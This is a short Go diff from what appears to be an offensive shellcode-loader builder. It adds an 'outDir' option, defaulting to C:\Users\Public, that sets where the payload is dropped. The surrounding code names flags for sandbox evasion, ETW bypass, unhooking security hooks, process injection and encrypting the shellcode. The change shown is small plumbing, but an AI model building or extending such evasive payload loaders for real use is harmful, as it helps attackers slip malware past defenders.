@@ -28,12 +28,13 @@ type FlagOptions struct {
 	valid            string
 	configfile       string
 	ProcessInjection string
+	encoding         string
+	outDir           string
 	ETW              bool
 	console          bool
 	refresher        bool
 	sandbox          bool
 	sleep            bool
-	encoding         string
 }
 
 func options() *FlagOptions {
@@ -62,8 +63,9 @@ func options() *FlagOptions {
 	sandbox := flag.Bool("sandbox", false, `Enables sandbox evasion using IsDomainedJoined calls.`)
 	sleep := flag.Bool("nosleep", false, `Disables the sleep delay before the loader unhooks and executes the shellcode.`)
 	encoding := flag.String("encoding", "b64", "Encodes payload in specified encoding, (b62 or b62)")
+	outDir := flag.String("outDir", "C:\\Users\\Public", "Specify the directory to drop our paylaod.")
 	flag.Parse()
-	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, URL: *URL, LoaderType: *LoaderType, CommandLoader: *CommandLoader, domain: *domain, password: *password, configfile: *configfile, console: *console, ETW: *ETW, ProcessInjection: *ProcessInjection, refresher: *refresher, valid: *valid, sandbox: *sandbox, sleep: *sleep, encoding: *encoding}
+	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, URL: *URL, LoaderType: *LoaderType, CommandLoader: *CommandLoader, domain: *domain, password: *password, configfile: *configfile, console: *console, ETW: *ETW, ProcessInjection: *ProcessInjection, refresher: *refresher, valid: *valid, sandbox: *sandbox, sleep: *sleep, encoding: *encoding, outDir: *outDir}
 }
 
 func execute(opt *FlagOptions, name string) string {
@@ -204,6 +206,6 @@ func main() {
 	fmt.Println("[+] Shellcode Encrypted")
 	name, filename := Loader.CompileFile(b64ciphertext, b64key, b64iv, opt.LoaderType, opt.outFile, opt.refresher, opt.console, opt.sandbox, opt.ETW, opt.ProcessInjection, opt.sleep)
 	name = execute(opt, name)
-	Loader.CompileLoader(opt.LoaderType, opt.outFile, filename, name, opt.CommandLoader, opt.URL, opt.sandbox, opt.encoding)
+	Loader.CompileLoader(opt.LoaderType, opt.outFile, filename, name, opt.CommandLoader, opt.URL, opt.sandbox, opt.encoding, opt.outDir)
 
 }
